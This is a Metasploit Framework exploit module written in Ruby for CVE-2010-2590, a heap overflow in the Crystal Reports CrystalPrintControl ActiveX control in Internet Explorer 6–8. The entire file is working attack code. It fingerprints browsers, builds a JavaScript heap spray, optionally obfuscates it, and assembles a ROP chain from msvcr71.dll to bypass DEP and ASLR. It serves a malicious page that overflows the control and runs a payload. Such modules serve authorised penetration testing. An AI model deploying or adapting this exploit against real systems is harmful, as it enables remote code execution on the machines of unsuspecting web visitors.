##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb
  include Msf::Exploit::Remote::BrowserAutopwn

  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "6.0",
    :ua_maxver  => "8.0",
    :javascript => true,
    :os_name    => OperatingSystems::WINDOWS,
    :rank       => NormalRanking,
    :classid    => "{88DD90B6-C770-4CFF-B7A4-3AFD16BB8824}",
    :method     => "ServerResourceVersion"
  })


  def initialize(info={})
    super(update_info(info,
      'Name'           => "Crystal Reports CrystalPrintControl ActiveX ServerResourceVersion Property Overflow",
      'Description'    => %q{
          This module exploits a heap based buffer overflow in the CrystalPrintControl
        ActiveX, while handling the ServerResourceVersion property. The affected control
        can be found in the PrintControl.dll component as included with Crystal Reports
        2008. This module has been tested successfully on IE 6, 7 and 8 on Windows XP SP3
        and IE 8 on Windows 7 SP1. The module uses the msvcr71.dll library, loaded by the
        affected ActiveX control, to bypass DEP and ASLR.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Dmitriy Pletnev', # Vulnerability discovery
          'Dr_IDE', # PoC
          'juan vazquez' # Metasploit
        ],
      'References'     =>
        [
          [ 'CVE', '2010-2590' ],
          [ 'OSVDB', '69917' ],
          [ 'BID', '45387' ],
          [ 'EDB', '15733' ]
        ],
      'Payload'        =>
        {
          'Space' => 890,
          'BadChars' => "\x00",
          'DisableNops' => true,
          'PrependEncoder' => "\x81\xc4\xa4\xf3\xfe\xff" # Stack adjustment # add esp, -500
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # Using jre rop because msvcr71.dll is installed with the ActiveX control
          # Crystal Reports 2008 / PrintControl.dll 12.0.0.683
          [ 'Automatic', {} ],
          [ 'IE 6 on Windows XP SP3',
            {
              'Rop' => nil,
              'Offset' => '0x5F4',
              'Ret' => 0x0c0c0c08
            }
          ],
          [ 'IE 7 on Windows XP SP3',
            {
              'Rop' => nil,
              'Offset' => '0x5F4',
              'Ret' => 0x0c0c0c08
            }
          ],
          [ 'IE 8 on Windows XP SP3',
            {
              'Rop' => :jre,
              'Offset' => '0x5f4',
              'Ret' => 0x0c0c0c0c,
              'Pivot' => 0x7c342643 # xchg eax, esp # pop edi # add byte ptr [eax],al # pop ecx # ret
            }
          ],
          [ 'IE 8 on Windows 7',
            {
              'Rop' => :jre,
              'Offset' => '0x5f4',
              'Ret' => 0x0c0c0c0c,
              'Pivot' => 0x7c342643 # xchg eax, esp # pop edi # add byte ptr [eax],al # pop ecx # ret
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Dec 14 2010",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
      ], self.class)

  end

  def get_target(agent)
    #If the user is already specified by the user, we'll just use that
    return target if target.name != 'Automatic'

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
    ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

    ie_name = "IE #{ie}"

    case nt
    when '5.1'
      os_name = 'Windows XP SP3'
    when '6.0'
      os_name = 'Windows Vista'
    when '6.1'
      os_name = 'Windows 7'
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        print_status("Target selected as: #{t.name}")
        return t
      end
    end

    return nil
  end

  def ie_heap_spray(my_target, p)
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))

    # Land the payload at 0x0c0c0c0c
    # For IE 6, 7, 8
    js = %Q|
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");
    while (nops.length < 0x80000) nops += nops;
    var offset = nops.substring(0, #{my_target['Offset']});
    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);
    heap_obj.gc();
    for (var i=1; i < 0x300; i++) {
      heap_obj.alloc(block);
    }
    var overflow = nops.substring(0, 10);
    |

    js = heaplib(js, {:noobfu => true})

    if datastore['OBFUSCATE']
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    return js
  end

  def get_payload(t, cli)
    code = payload.encoded

    # No rop. Just return the payload.
    return code if t['Rop'].nil?

    # Both ROP chains generated by mona.py - See corelan.be
    print_status("Using JRE ROP")
    rop_payload = generate_rop_payload('java', code, {'pivot' => [t['Pivot']].pack("V")})

    return rop_payload
  end

  def load_exploit_html(my_target, cli)
    p  = get_payload(my_target, cli)
    js = ie_heap_spray(my_target, p)

    # This rop chain can't contain NULL bytes, because of this RopDB isn't used
    # rop chain generated with mona.py
    rop_gadgets =
      [
        0x7c37653d, # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
        0xfffffdff,  # Value to negate, will become 0x00000201 (dwSize)
        0x7c347f98,  # RETN (ROP NOP) [msvcr71.dll]
        0x7c3415a2,  # JMP [EAX] [msvcr71.dll]
        0xffffffff,  #
        0x7c376402,  # skip 4 bytes [msvcr71.dll]
        0x7c351e05,  # NEG EAX # RETN [msvcr71.dll]
        0x7c345255,  # INC EBX # FPATAN # RETN [msvcr71.dll]
        0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll]
        0x7c344f87,  # POP EDX # RETN [msvcr71.dll]
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x7c351eb1,  # NEG EDX # RETN [msvcr71.dll]
        0x7c34d201,  # POP ECX # RETN [msvcr71.dll]
        0x7c38b001,  # &Writable location [msvcr71.dll]
        0x7c347f97,  # POP EAX # RETN [msvcr71.dll]
        0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
        0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN [msvcr71.dll]
        0x7c345c30,  # ptr to 'push esp #  ret ' [msvcr71.dll]
      ].pack("V*")

    # Allow to easily stackpivot to the payload
    # stored on the sprayed heap
    stackpivot_to_spray = %Q|
      mov esp, 0x0c0c0c10
      ret
    |

    # Space => 0x940 bytes
    # 0x40c: Fill the current CrystalPrintControl object
    # 0x8: Overflow next heap chunk header
    # 0x52c: Overflow next CrystalPrintControl object until the ServerResourceVersion offset
    bof = rand_text_alpha(1036)
    bof << [0x01010101].pack("V") # next heap chunk header
    bof << [0x01010101].pack("V") # next heap chunk header
    bof << [my_target.ret].pack("V")
    bof << [0x7c3410c4].pack("V") # ret # msvcr71
    bof << [0x7c3410c4].pack("V") # ret # msvcr71
    bof << [0x7c3410c4].pack("V") # ret # msvcr71
    bof << [0x7c3410c4].pack("V") # ret # msvcr71
    bof << [0x7c3410c4].pack("V") # ret # msvcr71
    bof << [0x7c3410c4].pack("V") # ret # msvcr71
    bof << [0x7c3410c4].pack("V") # ret # msvcr71
    bof << [0x7c3410c4].pack("V") # ret # msvcr71 # eip for w7 sp0 / ie8
    bof << rop_gadgets
    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, stackpivot_to_spray).encode_string
    bof << rand_text_alpha(0x940 - bof.length)

    js_bof = Rex::Text.to_unescape(bof, Rex::Arch.endian(my_target.arch))

    target = rand_text_alpha(5 + rand(3))
    target2 = rand_text_alpha(5 + rand(3))
    target3 = rand_text_alpha(5 + rand(3))
    target4 = rand_text_alpha(5 + rand(3))
    target5 = rand_text_alpha(5 + rand(3))
    target6 = rand_text_alpha(5 + rand(3))
    target7 = rand_text_alpha(5 + rand(3))
    target8 = rand_text_alpha(5 + rand(3))
    target9 = rand_text_alpha(5 + rand(3))
    target10 = rand_text_alpha(5 + rand(3))
    target11 = rand_text_alpha(5 + rand(3))
    target12 = rand_text_alpha(5 + rand(3))
    target13 = rand_text_alpha(5 + rand(3))
    target14 = rand_text_alpha(5 + rand(3))
    target15 = rand_text_alpha(5 + rand(3))

    # - 15 CrystalPrintControl objects are used to defragement the heap.
    # - The 10th CrystalPrintControl is overflowed.
    # - After the overflow, trying to access the overflowed object, control
    # can be obtained.
    html = %Q|
    <html>
    <head>
    <script>
    #{js}
    </script>
    </head>
    <body>
    <object id='#{target}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target2}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target3}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target4}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target5}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target6}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target7}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target8}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target9}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target10}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target11}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target12}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target13}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target14}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <object id='#{target15}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
    <script>
    var ret = unescape('#{js_bof}');
    #{target9}.ServerResourceVersion = ret;
    var c = #{target10}.BinName.length;
    </script>
    </body>
    </html>
    |

    return html
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    uri   = request.uri
    print_status("Requesting: #{uri}")

    my_target = get_target(agent)
    # Avoid the attack if no suitable target found
    if my_target.nil?
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    html = load_exploit_html(my_target, cli)
    html = html.gsub(/^\t\t/, '')
    print_status("Sending HTML...")
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

end
